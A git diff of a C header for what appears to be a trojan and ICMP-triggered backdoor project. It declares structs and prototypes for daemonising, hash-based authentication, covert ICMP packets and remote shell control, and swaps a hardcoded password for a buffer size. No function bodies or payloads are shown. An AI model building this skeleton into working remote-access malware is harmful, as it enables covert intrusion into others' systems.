@@ -11,13 +11,16 @@
 # include <sys/socket.h>
 # include <sys/types.h>
 # include <sys/stat.h>
-# include <sys/socket.h>
 # include <sys/time.h>
 # include <sys/select.h>
+# include <sys/file.h>
+# include <sys/ioctl.h>
+# include <sys/wait.h>
 # include <netinet/ip.h>
 # include <netinet/ip_icmp.h>
 # include <pwd.h>
 # include <arpa/inet.h>
+# include <fcntl.h>
 # include <string.h>
 # include <errno.h>
 
@@ -28,7 +31,7 @@
 # define BACKLOG 3
 # define MAX_CLIENTS 3
 # define PACKET_SIZE 64
-# define PASSWORD "dejamehacermismierdas"
+# define BUFFER 1024
 
 typedef struct s_troyan
 {
@@ -36,11 +39,13 @@ typedef struct s_troyan
     int                 bytes_read;
     int                 opc;
     char                buffer_exe[1024];
+    char                **env;
     FILE                *fd;
     FILE                *fd_dest;
     FILE                *fd_init;
     struct passwd       *pwd;
     struct sockaddr_in  target_addr;
+    unsigned char       master_hash[32];
 } t_troyan;
 
 typedef struct s_backdoor
@@ -49,7 +54,12 @@ typedef struct s_backdoor
     char                *target_ip;
     char                *payload;
     char                packet[PACKET_SIZE];
+    char			    *buffer;
+    char                buff[BUFFER];
+    fd_set              readfds;
+    ssize_t             bytes_read;
     struct sockaddr_in  target_addr;
+    struct sockaddr_in  server_addr;
     struct icmphdr      *icmp_hdr;
 } t_backdoor;
 
@@ -65,10 +75,16 @@ void        ft_connection(t_troyan *shield, int socket_client);
 void        init_signal();
 void        sigalrm_handler(int signum);
 void        sigint_handler(int signum);
+int         ft_create_daemon(t_troyan *shield);
+int         ft_auth(int client_fd);
+int         wait_backdoor();
+int         ft_verify_hash(const unsigned char *incoming_hash);
+void        ft_sha256(const char *input, size_t len, unsigned char output[32]);
 
 /*** CLIENT FUNCTIONS ***/
 int         socket_creation(t_backdoor *backdoor);
 void        icmp_creation(t_backdoor *backdoor);
 uint16_t    calculate_checksum(void *packet, size_t len);
+int         ft_shell_control(t_backdoor *backdoor);
 
 #endif
